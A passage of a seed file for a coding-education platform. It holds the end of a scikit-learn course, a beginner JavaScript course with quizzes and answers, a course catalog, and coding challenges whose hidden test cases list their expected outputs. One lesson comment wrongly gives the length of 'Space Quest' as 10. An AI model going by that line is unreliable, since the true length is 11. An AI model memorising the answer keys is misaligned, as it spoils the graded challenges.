smaller number fights overfitting at the risk of underfitting if set too low.\n\n> [!NOTE]\n> Limiting \`max_depth\` is one of the simplest ways to fight a decision tree's tendency to overfit, an unconstrained tree can always find a rule that perfectly separates the training data, whether or not that rule means anything for new data.`
    ),
    quiz: {
      title: 'Overfitting and Cross-Validation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the classic sign that a model has overfit?',
          options: [
            'Training takes a long time',
            'A wide gap between high train accuracy and much lower test accuracy',
            'The model has too few features',
            'Test accuracy is higher than train accuracy',
          ],
          answer: 'A wide gap between high train accuracy and much lower test accuracy',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'k-fold cross-validation gives a more reliable performance estimate than a single train/test split by averaging results across multiple splits.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____SearchCV automates trying every hyperparameter combination in a grid and reports the best cross-validated score.',
          options: [],
          answer: 'Grid',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Complete Classifier Pipeline',
    content: lessonContent(
      'Final Project: Build a Complete Classifier Pipeline',
      `Every piece from this course now exists on its own: loading and splitting data, training classifiers, evaluating with more than just accuracy, scaling features safely with \`Pipeline\`, and validating robustly with cross-validation and \`GridSearchCV\`. This final project assembles all of it into one complete, defensible ML workflow.\n\n## Requirements\n\nYour finished \`ml_project.py\` should satisfy every one of these:\n\n1. Load a classification dataset (\`load_iris\`, \`load_wine\`, \`load_breast_cancer\`, or your own via \`make_classification\`) and split it with \`train_test_split\`.\n2. Build a \`Pipeline\` combining \`StandardScaler\` with a classifier of your choice.\n3. Fit the pipeline and report accuracy, a confusion matrix, precision, and recall on the held-out test set.\n4. Run \`cross_val_score\` on the same pipeline and print the mean cross-validated accuracy, does it roughly agree with your single-split test accuracy?\n5. Use \`GridSearchCV\` to tune at least one hyperparameter of your classifier, and report the best parameters found.\n\n\`\`\`python\nfrom sklearn.datasets import load_wine\nfrom sklearn.model_selection import train_test_split, cross_val_score, GridSearchCV\nfrom sklearn.preprocessing import StandardScaler\nfrom sklearn.neighbors import KNeighborsClassifier\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.metrics import accuracy_score, confusion_matrix, precision_score, recall_score\n\n# 1. Load and split\ndata = load_wine()\nX_train, X_test, y_train, y_test = train_test_split(\n    data.data, data.target, test_size=0.2, random_state=42\n)\n\n# 2. Build the pipeline\npipeline = Pipeline([\n    ('scaler', StandardScaler()),\n    ('knn', KNeighborsClassifier()),\n])\n\n# 3. Fit and evaluate\npipeline.fit(X_train, y_train)\npreds = pipeline.predict(X_test)\nprint('Accuracy:', accuracy_score(y_test, preds))\nprint('Confusion matrix:\\n', confusion_matrix(y_test, preds))\nprint('Precision (macro):', precision_score(y_test, preds, average='macro'))\nprint('Recall (macro):', recall_score(y_test, preds, average='macro'))\n\n# 4. Cross-validate\ncv_scores = cross_val_score(pipeline, data.data, data.target, cv=5)\nprint('Mean CV accuracy:', cv_scores.mean())\n\n# 5. Tune a hyperparameter\nparam_grid = {'knn__n_neighbors': [1, 3, 5, 7, 9, 11]}\ngrid = GridSearchCV(pipeline, param_grid, cv=5)\ngrid.fit(data.data, data.target)\nprint('Best params:', grid.best_params_)\nprint('Best CV score:', grid.best_score_)\n\`\`\`\n\nNotice \`param_grid\` uses the key \`'knn__n_neighbors'\`, the double-underscore syntax lets \`GridSearchCV\` reach *inside* a \`Pipeline\` and tune a specific step's parameter, \`stepname__paramname\`.\n\n## Stretch goals\n\n- Try a different classifier in the pipeline (\`RandomForestClassifier\`, \`SVC\`, \`LogisticRegression\`) and compare cross-validated scores.\n- Try a different dataset (\`load_breast_cancer\` is a good binary-classification option) and see how precision/recall behave differently from a balanced multi-class problem like wine or iris.\n- Expand \`param_grid\` to tune more than one hyperparameter at once, \`GridSearchCV\` will try every combination.\n- Plot the confusion matrix visually instead of printing raw numbers (matplotlib is available in this sandbox too).\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const publicSampleLessons: SeedLesson[] = [
  {
    title: 'Hello, Programming!',
    content: lessonContent(
      'Hello, Programming!',
      `Welcome! This is your first step into programming, no experience required. We'll use **JavaScript**, the language that runs in every web browser, so you can try it right here without installing anything.\n\n\`\`\`js\n// This is a comment, the computer ignores it, it's a note for humans.\nlet name = "friend";\nconsole.log("Hello, " + name + "!");\n\`\`\`\n\n## Reading it line by line\n\n- \`let name = "friend";\` creates a **variable**, a named box that holds a value, here the text \`"friend"\`.\n- \`console.log(...)\` prints whatever is inside the parentheses, the most common way to see what your code is doing.\n- \`"Hello, " + name + "!"\` **concatenates** (joins) three pieces of text into one: \`"Hello, "\`, the value stored in \`name\`, and \`"!"\`.\n\n## Try it yourself\n\nChange \`"friend"\` to your own name in the code block above, then click **Run** and watch the output update.\n\n## Why variables matter\n\nWithout a variable, you'd have to retype \`"friend"\` everywhere you wanted to use it. With one, you can change the value in a single place and everything that uses it updates. This idea, storing and reusing values, is the foundation everything else in programming builds on.`
    ),
    quiz: {
      title: 'Hello, Programming! Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does console.log(...) do?',
          options: ['Deletes a variable', 'Prints its contents to the console', 'Creates a new file', 'Runs a quiz'],
          answer: 'Prints its contents to the console',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'let name = "friend"; creates a ____ that holds the value "friend".',
          options: [],
          answer: 'variable',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Text after // on a line is a comment and is ignored by the computer.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Data Types and Operators',
    content: lessonContent(
      'Data Types and Operators',
      `Every value in JavaScript has a **type**, and the type determines what you can do with it.\n\n\`\`\`js\nlet age = 16;               // number\nlet price = 19.99;          // also a number, JS doesn't separate int/float\nlet title = "Space Quest";  // string\nlet isAvailable = true;     // boolean\n\nconsole.log(age + 4);       // 20\nconsole.log(title.length);  // 10\nconsole.log(isAvailable);   // true\n\`\`\`\n\n## Common types\n\n| Type | Example |\n|---|---|\n| number | \`16\`, \`19.99\`, \`-3\` |\n| string | \`"Space Quest"\` |\n| boolean | \`true\` / \`false\` |\n\n## Operators\n\n- Arithmetic: \`+ - * /\` work on numbers as you'd expect. \`+\` on two strings **joins** them instead of adding.\n- Comparison: \`===\` checks if two values are equal (strictly, without converting types), \`!==\` checks if they're not equal, \`<\`, \`>\`, \`<=\`, \`>=\` compare numbers.\n\n\`\`\`js\nconsole.log(5 === 5);     // true\nconsole.log(5 === "5");   // false, different types\nconsole.log(10 > 3);      // true\n\`\`\`\n\n## Why === and not ==\n\nJavaScript also has \`==\`, which converts types before comparing (\`"5" == 5\` is \`true\`), that hidden conversion causes subtle bugs. Prefer \`===\`/\`!==\`, which compare exactly what you wrote.`
    ),
    quiz: {
      title: 'Data Types & Operators Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does === check, unlike ==?',
          options: [
            'Nothing, they are identical',
            'Equality without converting types first',
            'Only whether both are numbers',
            'Whether a variable exists',
          ],
          answer: 'Equality without converting types first',
        },
        {
          type: 'FILL_BLANK',
          prompt: '5 === "5" evaluates to ____, since the two values have different types.',
          options: [],
          answer: 'false',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using + on two strings joins (concatenates) them instead of adding.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Making Decisions with if/else',
    content: lessonContent(
      'Making Decisions with if/else',
      `Programs need to react differently depending on the situation, that's what \`if\`/\`else\` is for.\n\n\`\`\`js\nlet score = 72;\n\nif (score >= 90) {\n  console.log("Grade: A");\n} else if (score >= 70) {\n  console.log("Grade: B");\n} else {\n  console.log("Grade: C or below");\n}\n\`\`\`\n\n## The pieces\n\n- \`if (condition) { ... }\` runs its block only when \`condition\` is \`true\`.\n- \`else if (condition) { ... }\` checks another condition, only if every earlier one was \`false\`.\n- \`else { ... }\` runs when none of the earlier conditions matched, it's the fallback.\n- Conditions are usually built from comparison operators (\`>=\`, \`===\`, ...) and can be combined with \`&&\` (**and**, both must be true) and \`||\` (**or**, at least one must be true).\n\n\`\`\`js\nlet age = 20;\nlet hasTicket = true;\n\nif (age >= 18 && hasTicket) {\n  console.log("Welcome in!");\n}\n\`\`\`\n\n## Truthy and falsy\n\nValues other than actual booleans still work inside an \`if\`, \`0\`, \`""\` (empty string), and \`null\` all act like \`false\`, almost everything else acts like \`true\`. This is handy for quick checks like \`if (name) { ... }\` (runs only if \`name\` isn't empty), but can also be surprising if you're not expecting it.`
    ),
    quiz: {
      title: 'if/else Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which operator requires BOTH sides to be true for the whole expression to be true?',
          options: ['||', '&&', '===', '!'],
          answer: '&&',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'An ____ block runs only when every earlier if/else if condition was false.',
          options: [],
          answer: 'else',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An empty string "" behaves like false inside an if condition.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Loops: Repeating Actions',
    content: lessonContent(
      'Loops: Repeating Actions',
      `Loops let you repeat code without copy-pasting it, essential once you need to process more than a handful of items.\n\n\`\`\`js\nfor (let i = 1; i <= 5; i++) {\n  console.log("Lesson " + i);\n}\n\nlet scores = [80, 92, 67, 100];\nfor (const s of scores) {\n  console.log(s);\n}\n\`\`\`\n\n## for loops\n\nA classic \`for (init; condition; increment)\` loop: \`let i = 1\` runs once at the start, \`i <= 5\` is checked before every pass, \`i++\` runs after every pass. Together they count from 1 to 5, printing a line each time.\n\n## for...of loops\n\n\`for (const s of scores)\` visits every element in an array directly, no counter needed, use it whenever you don't care about the index, just each value.\n\n## while loops\n\n\`\`\`js\nlet attempts = 0;\nwhile (attempts < 3) {\n  console.log("Attempt " + (attempts + 1));\n  attempts++;\n}\n\`\`\`\n\nA \`while (condition) { ... }\` loop keeps running as long as \`condition\` stays \`true\`, checked before every pass. Unlike \`for\`, nothing about a \`while\` loop's structure guarantees it'll ever stop, forgetting to update \`attempts\` here would loop forever, always make sure something inside the loop moves it toward \`false\`.`
    ),
    quiz: {
      title: 'Loops Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which loop is the best fit for visiting every element of an array without needing an index?',
          options: ['for...of', 'while', 'do', 'switch'],
          answer: 'for...of',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In for (let i = 1; i <= 5; i++), the i++ part runs ____ every pass through the loop.',
          options: [],
          answer: 'after',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A while loop is guaranteed to stop on its own, even if nothing inside it changes the condition.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: FizzBuzz',
    content: lessonContent(
      'Final Project: FizzBuzz',
      `**FizzBuzz** is a classic beginner exercise, and a great way to prove you can combine loops and conditionals.\n\n## Requirements\n\n1. Loop through the numbers 1 to 100.\n2. For multiples of 3, print "Fizz" instead of the number.\n3. For multiples of 5, print "Buzz" instead of the number.\n4. For multiples of both 3 and 5, print "FizzBuzz".\n5. For every other number, print the number itself.\n\n## Getting started\n\n\`\`\`js\nfor (let i = 1; i <= 100; i++) {\n  // your logic here\n}\n\`\`\`\n\nThe \`%\` (modulo) operator gives you the remainder of a division, \`i % 3 === 0\` is \`true\` exactly when \`i\` is a multiple of 3.\n\n## Stretch goals\n\n- Rewrite it as a function \`fizzbuzz(n)\` that returns the array of results instead of printing directly.\n- Support a custom range, e.g. \`fizzbuzz(1, 50)\`.\n- Add a third rule of your own (e.g. multiples of 7 print "Bazz") and combine it correctly with the existing ones.\n\nSubmit your code (a repo link or gist) below when you're done, an instructor will review it before you can mark this lesson complete. Welcome to Kodstigen, ready to keep going? 🚀`
    ),
    requiresSubmission: true,
  },
];

const coursesByPath: Record<
  string,
  {
    title: string;
    description: string;
    lessons: SeedLesson[];
    /** a fixed, human-readable id instead of a random cuid, used for the free-sample course so
      * its URL is stable and can be referenced from robots.txt/sitemap.xml */
    id?: string;
    /** when true, the course detail page and its first lesson are viewable without an account */
    isPublic?: boolean;
  }[]
> = {
  nodejs: [
    {
      title: 'Node.js Backend Fundamentals',
      description: 'From your first console.log to a deployed REST API with authentication, the complete Node.js foundation.',
      lessons: nodeLessons,
    },
  ],
  python: [
    {
      title: 'Python for Absolute Beginners',
      description: 'Learn programming from zero with the most beginner-friendly language in the world.',
      lessons: pythonLessons,
    },
    {
      title: 'MongoDB with FastAPI & Python',
      description:
        'Build a real, async REST API with FastAPI and MongoDB: Pydantic models, CRUD with Motor, and a full backend project.',
      lessons: mongoFastApiLessons,
    },
    {
      title: 'Build Asteroids using Python and Pygame',
      description:
        "Build a clone of the classic Asteroids game using Pygame and object-oriented programming concepts. This guided project will help you understand how to use Pygame to create a game loop, handle user input, and manage game state. You'll also learn how to use object-oriented programming to create game objects and manage their interactions.",
      lessons: pygameAsteroidsLessons,
    },
    {
      title: 'Build a Match-3 Game using Python and Kivy',
      description:
        "Build a Candy Crush-style Match-3 puzzle game with Kivy, the Python framework for cross-platform apps and mobile games. You'll model the board as plain Python data, render it with Kivy's layout and button widgets, handle taps to select and swap adjacent gems, detect 3-in-a-row matches, and resolve cascades until the board settles.",
      lessons: kivyMatch3Lessons,
    },
    {
      title: 'Retrieval-Augmented Generation (RAG) with Python',
      description:
        "Build a complete RAG pipeline from scratch in 8 steps: collecting documents, chunking, embedding, vector storage, embedding a query, retrieval, augmentation, and generating a grounded LLM response. You'll write real, runnable Python for every step, no API key required until the very last one.",
      lessons: ragLessons,
    },
    {
      title: 'Build Your Own AI Coding Agent',
      description:
        "Learn how LLMs, function calling, and agent loops actually work by building a real AI coding agent: send prompts via OpenRouter and the OpenAI SDK, write the tool functions your agent needs, wire up function calling, then give it a feedback loop so it can autonomously read, run, and fix a real bug.",
      lessons: aiAgentLessons,
    },
    {
      title: 'Qiskit Fundamentals',
      description:
        "Learn quantum computing with IBM's Qiskit SDK: build circuits, create superposition and entanglement, run shot-based simulations, build a genuine quantum random number generator, and understand how real quantum hardware differs from an ideal simulator.",
      lessons: qiskitLessons,
    },
    {
      title: 'Cirq Fundamentals',
      description:
        "Learn quantum computing with Google's Cirq SDK: build circuits from qubits and operations, create superposition and entanglement, run repetition-based simulations, build a quantum random number generator, and simulate realistic hardware noise.",
      lessons: cirqLessons,
    },
    {
      title: 'Machine Learning Fundamentals with scikit-learn',
      description:
        "Learn classical machine learning with scikit-learn: train classifiers and regressors, split and evaluate data properly, understand precision/recall beyond accuracy, scale features safely with Pipeline, and validate models with cross-validation and GridSearchCV. Every lesson runs live in your browser, no local install needed.",
      lessons: sklearnLessons,
    },
  ],
  javascript: [
    {
      title: 'Modern JavaScript Essentials',
      description: 'DOM manipulation, array methods, and async programming, everything the modern web is built on.',
      lessons: jsLessons,
    },
    {
      title: 'JSON & the DOM',
      description:
        'Parse and generate JSON, then use it to build and update real DOM elements, the pattern behind every JSON-driven web UI.',
      lessons: jsonDomLessons,
    },
  ],
  typescript: [
    {
      title: 'TypeScript from JavaScript',
      description: 'Level up your JavaScript with static types, interfaces, and compiler-driven confidence.',
      lessons: tsLessons,
    },
  ],
  cpp: [
    {
      title: 'C++ Foundations',
      description: 'Compiled programming, pointers, and memory, the bedrock of systems development.',
      lessons: cppLessons,
    },
    {
      title: 'Build Breakout using C++ and SFML',
      description:
        "Build a classic Breakout/Arkanoid clone with SFML, C++'s go-to library for 2D graphics and games. You'll open a window and run a real-time game loop, build a keyboard-controlled paddle and a bouncing ball as classes, lay out a grid of destructible bricks, detect collisions with SFML's rectangle intersection, and track score and lives until you win or lose.",
      lessons: sfmlBreakoutLessons,
    },
  ],
  git: [
    {
      title: 'Git & Version Control Fundamentals',
      description:
        'Learn to track changes, branch, merge, and collaborate on code using Git, the version control system behind virtually every modern software project.',
      lessons: gitLessons,
    },
  ],
  react: [
    {
      title: 'React Fundamentals',
      description: 'Component-based UI development with React, JSX, props, state, hooks, and building real interactive apps.',
      lessons: reactLessons,
    },
    {
      title: 'React-Expo',
      description: 'Take React from the browser to your phone: build real mobile apps with Expo, file-based navigation, native device APIs, and ship a build with EAS.',
      lessons: expoLessons,
    },
    {
      title: 'Build Tetris using React Native and Expo',
      description: 'Build the classic block-stacking game for mobile with Expo and TypeScript: a 10x20 board, all 7 tetrominoes with rotation, a gravity-driven game loop, touch controls, line-clearing, scoring, and a fair 7-bag next-piece queue.',
      lessons: tetrisExpoLessons,
    },
    {
      title: 'Animating with React Native Skia',
      description: 'High-performance 2D graphics and animation for React Native: the Skia Canvas, shapes and paths, animated values, transforms, and gesture-driven motion.',
      lessons: skiaLessons,
    },
  ],
  csharp: [
    {
      title: 'C# Foundations',
      description: 'Learn statically-typed, object-oriented programming with C# and the .NET ecosystem, from your first program to building console applications.',
      lessons: csharpLessons,
    },
    {
      title: 'C# Intermediate: OOP, Interfaces & Events',
      description: 'Go deeper into object-oriented C#: inheritance and polymorphism, interfaces vs abstract classes, generics, exception handling, delegates and events, and lambda expressions with Func/Action.',
      lessons: csharpIntermediateLessons,
    },
    {
      title: 'C# Async Programming: Task, async/await & Cancellation',
      description: 'Master asynchronous C#: what async/await actually do, running work concurrently with Task.WhenAll and Task.WhenAny, cancelling long-running operations with CancellationToken, handling exceptions across async code, and streaming results with IAsyncEnumerable.',
      lessons: csharpAsyncLessons,
    },
    {
      title: 'Unity Essentials: Physics, UI & Gameplay Systems',
      description: 'Build real gameplay in Unity: Rigidbody physics with collisions and triggers, raycasting, the UGUI Canvas system, the Input System, data-driven design with ScriptableObjects, object pooling for performance, and saving player data with PlayerPrefs and JSON.',
      lessons: csharpUnityEssentialsLessons,
    },
    {
      title: 'C# for Unity: Coroutines & Multiplayer Networking',
      description: 'Go from console apps to game code: GameObjects and the MonoBehaviour lifecycle, coroutines with IEnumerator for timed and multi-frame logic, and multiplayer networking with Netcode for GameObjects (NetworkObject, RPCs, NetworkVariables).',
      lessons: csharpUnityLessons,
    },
    {
      title: 'Build a 2D Platformer using Unity and C#',
      description: 'Build a complete, playable platformer from scratch: a Rigidbody2D player controller with a ground check, Tilemap level design, a smooth bounded camera follow, Animator-driven run/jump/idle animations, collectible coins and patrolling enemies, and a UI wired up to score, health, and level completion.',
      lessons: unityPlatformerLessons,
    },
  ],
  sql: [
    {
      title: 'SQL Fundamentals',
      description: 'Learn to query, filter, join, and aggregate data with SQL, the standard language for relational databases.',
      lessons: sqlLessons,
    },
    {
      title: 'Node.js, Prisma & PostgreSQL',
      description:
        'Go from raw SQL to a real, type-safe backend: model your data with Prisma, migrate a PostgreSQL database, and query it from a Node.js application.',
      lessons: nodePrismaLessons,
    },
  ],
  docker: [
    {
      title: 'Docker Fundamentals',
      description: 'Package, ship, and run applications anywhere with containers, images, Dockerfiles, and Docker Compose.',
      lessons: dockerLessons,
    },
  ],
  azure: [
    {
      title: 'Azure Fundamentals',
      description: 'Deploy, host, and scale real applications in the cloud with Microsoft Azure.',
      lessons: azureLessons,
    },
  ],
  kubernetes: [
    {
      title: 'Kubernetes Fundamentals',
      description: 'Orchestrate containers at scale: Pods, Deployments, Services, config and storage, and real kubectl workflows.',
      lessons: kubernetesLessons,
    },
  ],
  aws: [
    {
      title: 'AWS Fundamentals',
      description: 'Regions and IAM, EC2, S3, VPC networking, and serverless with Lambda and API Gateway.',
      lessons: awsLessons,
    },
  ],
  cicd: [
    {
      title: 'CI/CD Fundamentals',
      description: 'Build real pipelines with GitHub Actions: automated testing, Docker image builds, deployment strategies, and pipeline secrets.',
      lessons: cicdLessons,
    },
  ],
  observability: [
    {
      title: 'Logging and Observability',
      description: 'The three pillars of observability: structured logging, metrics and time-series data, distributed tracing, and alerting that does not burn out your team.',
      lessons: observabilityLessons,
    },
  ],
  'ai-coding': [
    {
      title: 'Prompt Engineering & Vibe Coding',
      description:
        'What to think about before, during, and after using an AI coding assistant: writing effective prompts, giving the right context, and reviewing what it builds.',
      lessons: promptEngineeringLessons,
    },
  ],
  html: [
    {
      title: 'HTML Foundations',
      description: 'The building blocks of every website: structure, semantics, forms, and accessibility with HTML.',
      lessons: htmlLessons,
    },
  ],
  css: [
    {
      title: 'CSS Foundations',
      description: 'Style and lay out the web: the box model, Flexbox, Grid, responsive design, and animation with CSS.',
      lessons: cssLessons,
    },
  ],
  lua: [
    {
      title: 'Lua Fundamentals',
      description: 'A lightweight, embeddable scripting language: variables, tables, functions, and metatables, from your first script to a text adventure.',
      lessons: luaLessons,
    },
    {
      title: 'Lua Intermediate: OOP, Closures & Patterns',
      description: 'Go beyond the basics: closures and private state, full class hierarchies with inheritance, Lua string patterns, and proper error handling with pcall/xpcall.',
      lessons: luaIntermediateLessons,
    },
    {
      title: 'Lua Advanced: Coroutines, Metamethods & Performance',
      description: 'Cooperative multitasking with coroutines, operator overloading and __call/__newindex, variadic functions, and garbage collection with weak tables.',
      lessons: luaAdvancedLessons,
    },
  ],
  cybersecurity: [
    {
      title: 'Cybersecurity Fundamentals',
      description: 'Think like an attacker to defend like a pro: the CIA triad, common attack vectors, network and web app security, cryptography, and access control.',
      lessons: cybersecurityLessons,
    },
  ],
  c: [
    {
      title: 'C Programming',
      description: 'Get close to the machine: structs, pointers, manual memory management, and build your own garbage collector from scratch.',
      lessons: cLessons,
    },
  ],
  linux: [
    {
      title: 'Linux Fundamentals',
      description: 'The command line, filesystems, processes, permissions, and setting up a real development environment.',
      lessons: linuxLessons,
    },
  ],
  java: [
    {
      title: 'Java Foundations',
      description: 'Statically-typed, object-oriented programming on the JVM: classes, collections, generics, and interfaces.',
      lessons: javaLessons,
    },
    {
      title: 'Modding Minecraft with Forge',
      description: 'Get a Forge mod running, then build your own custom item, block, and crafting recipe for Minecraft using Java and the Forge modding API.',
      lessons: minecraftModdingLessons,
    },
  ],
  kotlin: [
    {
      title: 'Kotlin Foundations',
      description: 'A modern, concise language for the JVM and Android: null safety, data classes, extension functions, and idiomatic Java interop.',
      lessons: kotlinLessons,
    },
  ],
  go: [
    {
      title: 'Go Fundamentals',
      description: 'A simple, fast, compiled language built for concurrency: structs, goroutines, channels, and error handling.',
      lessons: goLessons,
    },
  ],
  solidity: [
    {
      title: 'Solidity Fundamentals',
      description: 'Write smart contracts for Ethereum: state variables, functions and visibility, access control, mappings, and events.',
      lessons: solidityLessons,
    },
  ],
  gdscript: [
    {
      title: 'GDScript Fundamentals',
      description: "Godot's built-in scripting language: nodes, the scene tree, signals, and building real gameplay behavior.",
      lessons: gdscriptLessons,
    },
  ],
  public: [
    {
      id: 'sample-programming-basics',
      title: 'Programming Basics: Your First Steps',
      description:
        'A free introduction to programming with JavaScript, variables, data types, conditionals, and loops, capped off with the classic FizzBuzz exercise. The first lesson is open to everyone, no account required.',
      lessons: publicSampleLessons,
      isPublic: true,
    },
  ],
};

type SeedTestCase = { input: unknown[]; expectedOutput: unknown; isHidden: boolean };

type SeedChallenge = {
  slug: string;
  title: string;
  difficulty: ChallengeDifficulty;
  languages: ChallengeLanguage[];
  prompt: string;
  entryPoint: string;
  starterCode: Partial<Record<'python' | 'javascript' | 'typescript' | 'lua' | 'html' | 'c', string>>;
  testCases: SeedTestCase[];
  /** true = attributed to the demo instructor account instead of being a built-in challenge */
  instructorAuthored?: boolean;
};

const ALL_LANGS: ChallengeLanguage[] = ['PYTHON', 'JAVASCRIPT', 'TYPESCRIPT'];

const challenges: SeedChallenge[] = [
  {
    slug: 'sum-two-numbers',
    title: 'Sum Two Numbers',
    difficulty: 'EASY',
    languages: ALL_LANGS,
    prompt: 'Write `solve(a, b)` that returns the sum of two numbers.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(a, b):\n    pass\n',
      javascript: 'function solve(a, b) {\n  \n}\n',
      typescript: 'function solve(a: number, b: number): number {\n  \n}\n',
    },
    testCases: [
      { input: [2, 3], expectedOutput: 5, isHidden: false },
      { input: [-1, 1], expectedOutput: 0, isHidden: false },
      { input: [100, 250], expectedOutput: 350, isHidden: true },
    ],
  },
  {
    slug: 'reverse-a-string',
    title: 'Reverse a String',
    difficulty: 'EASY',
    languages: ALL_LANGS,
    prompt: 'Write `solve(s)` that returns the string `s` reversed.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(s):\n    pass\n',
      javascript: 'function solve(s) {\n  \n}\n',
      typescript: 'function solve(s: string): string {\n  \n}\n',
    },
    testCases: [
      { input: ['hello'], expectedOutput: 'olleh', isHidden: false },
      { input: ['a'], expectedOutput: 'a', isHidden: false },
      { input: ['Kodstigen'], expectedOutput: 'negitsdoK', isHidden: true },
    ],
  },
  {
    slug: 'count-vowels',
    title: 'Count Vowels',
    difficulty: 'EASY',
    languages: ALL_LANGS,
    prompt: 'Write `solve(s)` that returns the number of vowels (a, e, i, o, u, case-insensitive) in `s`.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(s):\n    pass\n',
      javascript: 'function solve(s) {\n  \n}\n',
      typescript: 'function solve(s: string): number {\n  \n}\n',
    },
    testCases: [
      { input: ['hello'], expectedOutput: 2, isHidden: false },
      { input: ['sky'], expectedOutput: 0, isHidden: false },
      { input: ['Programming'], expectedOutput: 3, isHidden: true },
    ],
  },
  {
    slug: 'find-the-maximum',
    title: 'Find the Maximum',
    difficulty: 'EASY',
    languages: ALL_LANGS,
    prompt: 'Write `solve(nums)` that returns the largest number in the list `nums`.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(nums):\n    pass\n',
      javascript: 'function solve(nums) {\n  \n}\n',
      typescript: 'function solve(nums: number[]): number {\n  \n}\n',
    },
    testCases: [
      { input: [[1, 5, 3]], expectedOutput: 5, isHidden: false },
      { input: [[-2, -5, -1]], expectedOutput: -1, isHidden: false },
      { input: [[42]], expectedOutput: 42, isHidden: true },
    ],
  },
  {
    slug: 'fizzbuzz-list',
    title: 'FizzBuzz List',
    difficulty: 'MEDIUM',
    languages: ALL_LANGS,
    prompt:
      'Write `solve(n)` that returns a list of strings for the numbers 1 to `n` (inclusive): "Fizz" for multiples of 3, "Buzz" for multiples of 5, "FizzBuzz" for multiples of both, otherwise the number as a string.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(n):\n    pass\n',
      javascript: 'function solve(n) {\n  \n}\n',
      typescript: 'function solve(n: number): string[] {\n  \n}\n',
    },
    testCases: [
      { input: [5], expectedOutput: ['1', '2', 'Fizz', '4', 'Buzz'], isHidden: false },
      { input: [3], expectedOutput: ['1', '2', 'Fizz'], isHidden: false },
      {
        input: [15],
        expectedOutput: [
          '1', '2', 'Fizz', '4', 'Buzz', 'Fizz', '7', '8', 'Fizz', 'Buzz', '11', 'Fizz', '13', '14', 'FizzBuzz',
        ],
        isHidden: true,
      },
    ],
  },
  {
    slug: 'is-palindrome',
    title: 'Is Palindrome',
    difficulty: 'MEDIUM',
    languages: ALL_LANGS,
    prompt: 'Write `solve(s)` that returns `true` if `s` reads the same forwards and backwards, `false` otherwise.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(s):\n    pass\n',
      javascript: 'function solve(s) {\n  \n}\n',
      typescript: 'function solve(s: string): boolean {\n  \n}\n',
    },
    testCases: [
      { input: ['level'], expectedOutput: true, isHidden: false },
      { input: ['hello'], expectedOutput: false, isHidden: false },
      { input: ['A'], expectedOutput: true, isHidden: true },
    ],
  },
  {
    slug: 'two-sum-indices',
    title: 'Two Sum Indices',
    difficulty: 'MEDIUM',
    languages: ALL_LANGS,
    prompt:
      'Write `solve(nums, target)` that returns the indices `[i, j]` (i < j) of the two numbers in `nums` that add up to `target`. Assume exactly one solution exists.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(nums, target):\n    pass\n',
      javascript: 'function solve(nums, target) {\n  \n}\n',
      typescript: 'function solve(nums: number[], target: number): number[] {\n  \n}\n',
    },
    testCases: [
      { input: [[2, 7, 11, 15], 9], expectedOutput: [0, 1], isHidden: false },
      { input: [[3, 2, 4], 6], expectedOutput: [1, 2], isHidden: false },
      { input: [[1, 5, 3, 7], 10], expectedOutput: [2, 3], isHidden: true },
    ],
  },
  {
    slug: 'fibonacci-number',
    title: 'Fibonacci Number',
    difficulty: 'MEDIUM',
    languages: ALL_LANGS,
    prompt: 'Write `solve(n)` that returns the `n`th Fibonacci number (0-indexed: fib(0) = 0, fib(1) = 1).',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(n):\n    pass\n',
      javascript: 'function solve(n) {\n  \n}\n',
      typescript: 'function solve(n: number): number {\n  \n}\n',
    },
    testCases: [
      { input: [0], expectedOutput: 0, isHidden: false },
      { input: [1], expectedOutput: 1, isHidden: false },
      { input: [10], expectedOutput: 55, isHidden: true },
    ],
  },
  {
    slug: 'valid-anagram',
    title: 'Valid Anagram',
    difficulty: 'HARD',
    languages: ALL_LANGS,
    prompt: 'Write `solve(s1, s2)` that returns `true` if `s2` is an anagram of `s1` (same letters, same counts), `false` otherwise.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(s1, s2):\n    pass\n',
      javascript: 'function solve(s1, s2) {\n  \n}\n',
      typescript: 'function solve(s1: string, s2: string): boolean {\n  \n}\n',
    },
    testCases: [
      { input: ['listen', 'silent'], expectedOutput: true, isHidden: false },
      { input: ['rat', 'car'], expectedOutput: false, isHidden: false },
      { input: ['anagram', 'nagaram'], expectedOutput: true, isHidden: true },
    ],
  },
  {
    slug: 'binary-search',
    title: 'Binary Search',
    difficulty: 'HARD',
    languages: ALL_LANGS,
